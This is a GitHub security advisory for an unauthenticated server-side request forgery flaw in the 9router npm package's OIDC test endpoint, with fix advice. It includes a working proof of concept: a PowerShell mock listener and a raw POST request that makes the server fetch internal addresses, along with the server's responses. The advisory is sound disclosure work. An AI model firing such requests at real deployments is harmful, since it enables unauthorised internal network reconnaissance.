# [H] 9Router: Authenticated Server-Side Request Forgery (SSRF) via OIDC Provider Test Endpoint

## Summary
Severity: High
Advisory: GHSA-8g4w-4ffg-8vgx
CVE: CVE-2026-56677
CWE: CWE-306, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-8g4w-4ffg-8vgx
Type: github-advisory

## Affected
- npm: `9router` — affected >=0

## Details
### Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in the 9Router dashboard via the `/api/auth/oidc/test` endpoint. The application accepts a user-controlled URL string through the `issuerUrl` parameter and performs an outbound HTTP request without validating if the destination IP belongs to a restricted internal network range.

Notably, this endpoint can be accessed without active session authentication (Unauthenticated), allowing any remote actor with network visibility to the dashboard API endpoints to trigger outbound infrastructure connections.

Depending on the state and response of the internal port targeted, this flaw exhibits two distinct behaviors:

1. **Port Scanning / Blind SSRF (Non-OIDC structures):** Probing internal ports that are closed or running non-HTTP/non-OIDC services (e.g., SSH, Databases) forces predictable application behavior changes (e.g., structural timeout or clear JSON parsing error messages like "Unexpected token..."), allowing internal network reconnaissance.
2. **Full Data Feed Manipulation (OIDC matching structures):** If the targeted internal service responds with a valid OpenID configuration document structure, the backend successfully processes, parses, and reflects the internal properties back to the client, confirming partial data control.

---

### Vulnerable Code Details

- **Classification:** VE-Class 4 — OIDC SSRF via issuerUrl (Unauthenticated)
- **File Path:** `src/app/api/auth/oidc/test/route.js`
- **Vulnerable Logic:** The endpoint accepts the parameter directly from the client request and passes it directly into the network client routine without prior sanitization or middleware authentication wrapper checks.

```javascript
// Vulnerable implementation wrapper inside the route handler
const discovery = await fetchOidcDiscovery(issuerUrl);
// Behind the scenes, this executes a direct dynamic outbound request:
// -> fetch(`${issuerUrl}/.well-known/openid-configuration`)
```

An unauthenticated user can point this at any internal URL to probe internal services that respond with JSON. The discovery JSON fields (`token_endpoint`, `jwks_uri`) are then processed by the internal application logic for further operations, enabling a multi-step SSRF chain.

---

### Affected Endpoints

- **Endpoint:** `/api/auth/oidc/test`
- **Method:** `POST`
- **Parameter:** `issuerUrl`
- **Impacted Feature:** OIDC Authentication Configuration Test

---

### Impact

An unauthenticated attacker can abuse this behavior to use the 9Router instance as a proxy to:

- Conduct internal network topology discovery and port scanning against the hosting infrastructure (`127.0.0.1`, `10.0.0.0/8`, `192.168.0.0/16`).
- Expose internal application error states or feed malicious configuration structures back into the dashboard component logic without needing prior valid session tokens.

---

### Proof of Concept & Reproducing Steps

#### Step 1: Set up the Verification Environment

Utilize a local mock listener on an internal port (e.g., Port 80).

Run the following PowerShell script with Administrative privileges to launch the mock listener:

```powershell
$port = 80
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://127.0.0.1:$port/")

try {
    $listener.Start()
    Write-Host "=======================================================" -ForegroundColor Cyan
    Write-Host "  MOCK OIDC SERVER RUNNING ON PORT 80" -ForegroundColor Green
    Write-Host "=======================================================" -ForegroundColor Cyan

    while ($listener.IsListening) {
        $context = $listener.GetContext()
        $request = $context.Request
        Write-Host "[+] SSRF Request received for URL: $($request.Url)" -ForegroundColor Yellow
        
        $jsonPayload = '{"issuer":"http://127.0.0.1","authorization_endpoint":"http://127.0.0.1/oauth/auth","token_endpoint":"http://127.0.0.1/oauth/token","userinfo_endpoint":"EVIDENCE_SSRF_CONFIRMED_SUCCESSFULLY","jwks_uri":"http://127.0.0.1/oauth/keys"}'

        $response = $context.Response
        $response.StatusCode = 200
        $response.ContentType = "application/json"
        
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($jsonPayload)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
        $response.Close()
        Write-Host "[*] JSON payload sent back to 9router" -ForegroundColor Green
    }
} catch {
    Write-Host "Error starting server on port 80" -ForegroundColor Red
} finally {
    if ($listener.IsListening) { $listener.Stop() }
}
```

#### Step 2: Triggering the Vulnerability via Burp Suite

Send the following raw HTTP request to the 9Router instance (Notice no Cookie header is required):

```http
POST /api/auth/oidc/test HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Connection: keep-alive
Content-Length: 54

{
  "issuerUrl": "http://127.0.0.1:80",
  "clientId": "probe_only"
}
```

#### Step 3: Objective Analysis of Results

**Scenario A: Targeting an Unmatched/Plain Text Port** (e.g., Port returning raw strings like `"check vul"`)

The server connects to the port, receives a non-JSON response, and errors out during parsing. The application response explicitly leaks the parsing failure:

```json
{"error":"Unexpected token 'c', \"check vul\" is not valid JSON"}
```

> **Analysis:** This confirms the backend successfully completed an outbound TCP handshake and read the payload from the internal resource, verifying an Error-based/Blind SSRF context without any user credentials.

---

**Scenario B: Targeting the Valid Mock Port** (Port 80 with the script active)

The backend connects to the mock listener, successfully fetches the fake configuration data, maps the internal endpoints, and replies with an HTTP 200 OK:

```json
{
  "ok": true,
  "discoveryOk": true,
  "issuerUrl": "http://127.0.0.1:80",
  "authorizationEndpoint": "http://127.0.0.1/oauth/auth",
  "tokenEndpoint": "http://127.0.0.1/oauth/token",
  "jwksUri": "http://127.0.0.1/oauth/keys"
}
```
<img width="1513" height="651" alt="image" src="https://github.com/user-attachments/assets/6621f418-7a0d-4660-b301-ad37468d8d7a" />

> **Analysis:** This confirms a Full Data Feed SSRF. The internal properties parsed directly from the mock script are completely reflected back in the public client response body.

---

### Root Cause Analysis

The application logic handles network requests initiated by user input inside `/api/auth/oidc/test` without validating the host destination. Additionally, the route handler lacks proper authentication middleware checks to safeguard the functionality, allowing anonymous requests to safely reach internal server loops or private IP subnets.

---

### Suggested Fix

1. **Implement Access Control:** Protect the `/api/auth/oidc/test` handler with authentication middleware to enforce valid user sessions.

2. **Enforce Protocol Controls:** Validate that `issuerUrl` strictly uses the `https://` protocol scheme before performing the fetch operation.

3. **Implement Network Blocklists:** Resolve the hostname within `issuerUrl` on the server-side before initiating the connection. Validate the resolved IP address and explicitly drop requests pointing to loopback addresses (`127.0.0.0/8`, `::1`) or internal private addresses (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).

## References
- https://github.com/decolua/9router/security/advisories/GHSA-8g4w-4ffg-8vgx
- https://github.com/decolua/9router
